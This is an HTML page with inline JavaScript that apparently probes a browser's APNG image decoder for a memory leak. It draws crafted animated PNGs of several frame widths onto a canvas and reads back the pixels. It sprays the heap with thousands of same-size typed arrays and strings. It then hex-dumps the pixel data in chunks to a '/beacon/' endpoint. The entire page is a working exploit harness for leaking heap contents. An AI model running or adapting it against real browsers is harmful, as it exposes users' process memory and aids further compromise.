<!DOCTYPE html><html><head><meta charset="utf-8"><title>apng4</title><script>
function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
function img(url){ return new Promise(function(res){ var i=new Image(); i.onload=function(){res(i);}; i.onerror=function(){res(null);}; i.src=url+'?t='+Date.now(); }); }
function hexAll(d,n){ var s=''; for(var i=0;i<n*4;i++) s+=('0'+d[i].toString(16)).slice(-2); return s; }
function dump(tag,d,n,chunk){ var h=hexAll(d,n); for(var o=0,part=0;o<h.length;o+=chunk,part++) b(tag+'-'+part+'-'+h.substr(o,chunk)); }
function draw(w,im){ var c=document.createElement('canvas'); c.width=w; c.height=1; var g=c.getContext('2d'); g.drawImage(im,0,0); var d=g.getImageData(0,0,w,1).data; window.__last=c; return d; }
function sprayU8(n,len,byte){ var a=[]; for(var i=0;i<n;i++){ var u=new Uint8Array(len); for(var j=0;j<len;j++) u[j]=(byte+j)&0xff; a.push(u); } return a; }
function sprayStr(n,len){ var a=[]; for(var i=0;i<n;i++){ var s=''; for(var j=0;j<len;j++) s+=String.fromCharCode(65+((i*7+j)%26)); a.push(s); } return a; }
function boot(){
  b('A4-BOOT');
  var files=['apng-fw1.png','apng-fw2.png','apng-fw4.png','apng-fw8.png','apng-fw16.png','apng-fw32.png'];
  var loads=[]; for(var i=0;i<files.length;i++) loads.push(img('/corpus/'+files[i]));
  Promise.all(loads).then(function(ims){
    for(var i=0;i<ims.length;i++){
      var im=ims[i]; if(!im){ b('A4-NOIMG-'+i); continue; }
      try{ var d=draw(64,im); b('A4-'+files[i]+'-dim-'+im.naturalWidth); dump('A4-'+files[i],d,64,700); }catch(e){ b('A4-'+files[i]+'-E-'+e.name); }
    }
    // Uint8Array(8) spray: same small size class as a 4-byte row buffer
    var u=sprayU8(4000,8,0x11); b('A4-U8-'+u.length);
    try{ var d2=draw(64,ims[0]); dump('A4-U8',d2,64,700); }catch(e){ b('A4-U8-E-'+e.name); }
    u.length=0; u=null;
    // short strings
    var s=sprayStr(4000,12); b('A4-S-'+s.length);
    try{ var d3=draw(64,ims[0]); dump('A4-S',d3,64,700); }catch(e){ b('A4-S-E-'+e.name); }
    s.length=0; s=null;
    b('A4-DONE');
  });
}
boot();
</script></head><body><p>apng4</p></body></html>
